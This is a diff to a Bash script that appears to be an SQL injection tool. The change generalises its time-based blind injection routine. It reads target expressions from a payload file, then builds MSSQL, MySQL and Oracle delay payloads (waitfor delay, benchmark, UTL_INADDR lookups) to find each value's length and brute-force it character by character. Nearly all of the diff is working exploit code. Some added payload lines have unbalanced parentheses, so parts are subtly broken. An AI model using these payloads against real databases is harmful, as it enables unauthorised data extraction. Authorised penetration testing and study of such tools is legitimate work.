@@ -2602,7 +2602,7 @@ fi
 
 #uncomment the below when timebased extraction is done...
 
-#if [[ "extract" == 0 ]] ; then
+#if [[ "$extract" == 0 ]] ; then
 #	#status/length diffing didnt work - lets try time based diffing:
 #	lettergrabtimebased
 #fi
@@ -2677,84 +2677,103 @@ if [[ "$nambuf" != "" ]] ; then
 fi
 
 if [[ "$check_flag" == "0" ]] ; then
-
-###get the length of the string
-horiz=40
-oflag=1
-while [[ $oflag -lt $horiz ]] ; do 
-	#only need to send the reference request (below) once
-	#this determines the 'always wrong' reference request to suit the dbms:
-	if [[ $oflag == "1" ]] ; then 
-		if [[ $dbms == "mssql" ]] ; then                            
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
+echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
+cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
+	###get the length of the string
+	horiz=40
+	oflag=1
+	while [[ $oflag -lt $horiz ]] ; do 
+		#only need to send the reference request (below) once
+		#this determines the 'always wrong' reference request to suit the dbms:
+		if [[ $oflag == "1" ]] ; then 
+			if [[ $dbms == "mssql" ]] ; then                            
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
+			elif [[ $dbms == "mysql" ]] ; then
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then benchmark(10000000,MD5(1)) else 0 end)$end"`
+			elif [[ $dbms == "oracle" ]] ; then
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
+			else
+				echo "Unable to determine DBMS"
+				oflag=40
+			fi
+			encodeinput=$badparams
+			encodeme
+			badparams=$encodeoutput
+			requester
+			if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
+		
+			time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+	
+		fi
+	
+		if [[ $dbms == "mssql" ]] ; then                                       
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len($findme) = $oflag) waitfor delay '0:0:8'$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then benchmark(10000000,MD5(1)) else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length(($findme)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
 		fi
+	
+		if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
+			
 		encodeinput=$badparams
 		encodeme
 		badparams=$encodeoutput
 		requester
-		if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
+		#echo "debug sending iflag $request"
+		time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
 	
-		time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
-
-	fi
-
-	if [[ $dbms == "mssql" ]] ; then                                       
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:8'$end"`
-	elif [[ $dbms == "mysql" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
-	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length((select user from dual)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
-	else
-		echo "Unable to determine DBMS"
-		oflag=40
-	fi
-
-	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
-		
-	encodeinput=$badparams
-	encodeme
-	badparams=$encodeoutput
-	requester
-	#echo "debug sending iflag $request"
-	time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
-
-	#echo "debug sending iflag $request"
-	((timediff=$time_true-$time_false))
-	gotlength=0
-	#echo "timediff=$timediff"	
-	#time response comparison (note that we ignore results with < 3 secs difference)
-	if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
-		remessage="SYS USER STRING LENGTH = $oflag"
-		echoreporter
-		sysuserlen=$oflag
-		oflag=40
-		gotlength=1	
-	fi
-	((oflag=$oflag+1)) 
-done
-###
-if [[ $gotlength == 1 ]] ; then
-	horiz=$sysuserlen #the length of the system user field in chars
-	oflag=1 #outerloop counter - this tracks the letters guessed correctly
-	#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
-	nambuf="" #an expading string buffer to store the reslts
-	echo "Attempting to brute force the system_user account name. If you get bored hit CNTRL+c to skip. Please wait..."
-	while [[ $oflag -le $horiz ]] ; do
-		for asciinumber in `cat ./payloads/letterlist.txt` ; do 
-		if [[ $iflag == "32" && $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for comparison.
-			if [[ $dbms == "mssql" ]] ; then                            
-				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber) waitfor delay '0:0:0'$end"`
+		#echo "debug sending iflag $request"
+		((timediff=$time_true-$time_false))
+		gotlength=0
+		#echo "timediff=$timediff"	
+		#time response comparison (note that we ignore results with < 3 secs difference)
+		if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+			remessage="$findme STRING LENGTH = $oflag"
+			echoreporter
+			sysuserlen=$oflag
+			oflag=40
+			gotlength=1	
+		fi
+		((oflag=$oflag+1)) 
+	done
+	###
+	if [[ $gotlength == 1 ]] ; then
+		horiz=$sysuserlen #the length of the system user field in chars
+		oflag=1 #outerloop counter - this tracks the letters guessed correctly
+		#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
+		nambuf="" #an expading string buffer to store the reslts
+		echo "Attempting to brute force $findme. If you get bored hit CNTRL+c to skip. Please wait..."
+		while [[ $oflag -le $horiz ]] ; do
+			for asciinumber in `cat ./payloads/letterlist.txt` ; do 
+			if [[ $iflag == "32" && $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for 	comparison.
+				if [[ $dbms == "mssql" ]] ; then                            
+					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber waitfor delay '0:0:0'$end"`
+				elif [[ $dbms == "mysql" ]] ; then
+					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
+				elif [[ $dbms == "oracle" ]] ; then
+					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+				else
+					echo "Unable to determine DBMS"
+					oflag=40
+					break
+				fi
+				encodeinput=$badparams
+				encodeme
+				badparams=$encodeoutput
+				requester
+				if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
+				time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+			fi
+			if [[ $dbms == "mssql" ]] ; then                                       
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring($findme,$oflag,1))=$asciinumber) waitfor delay '0:0:8'$end"`
 			elif [[ $dbms == "mysql" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) = $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 			elif [[ $dbms == "oracle" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr(($findme),$oflag,1)) = $asciinumber then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 			else
 				echo "Unable to determine DBMS"
 				oflag=40
@@ -2764,49 +2783,31 @@ if [[ $gotlength == 1 ]] ; then
 			encodeme
 			badparams=$encodeoutput
 			requester
-			if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
-			time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+			if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
+			time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
+	
+			#echo "debug sending iflag $request"
+			((timediff=$time_true-$time_false))
+			#echo "timediff=$timediff"
+			#time response comparison (note that we ignore results with < 3 secs difference)
+			if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+				decasciiconv
+				echo -n "$output"
+				nambuf="$nambuf$output"
+				if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
+				break
+			fi
+			done #end of inner loop
+			((oflag=$oflag+1))	
+		done
+		echo ""
+		if [[ $nambuf != "" ]] ; then 
+			remessage="$findme: $nambuf"
+			echoreporter
+			extract=1
 		fi
-		if [[ $dbms == "mssql" ]] ; then                                       
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber) waitfor delay '0:0:8'$end"`
-		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then benchmark(10000000,MD5(1)) else 0 end)$end"`
-		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
-		else
-			echo "Unable to determine DBMS"
-			oflag=40
-			break
-		fi
-		encodeinput=$badparams
-		encodeme
-		badparams=$encodeoutput
-		requester
-		if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
-		time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
-
-		#echo "debug sending iflag $request"
-		((timediff=$time_true-$time_false))
-		#echo "timediff=$timediff"
-		#time response comparison (note that we ignore results with < 3 secs difference)
-		if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
-			decasciiconv
-			echo -n "$output"
-			nambuf="$nambuf$output"
-			if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
-			break
-		fi
-		done #end of inner loop
-		((oflag=$oflag+1))	
-	done
-	echo ""
-	if [[ $nambuf != "" ]] ; then 
-		remessage="SYS USER IS: $nambuf"
-		echoreporter
-		extract=1
 	fi
-fi
-
+done
 #extra fi for end of checkflag if statement:
 fi
 }
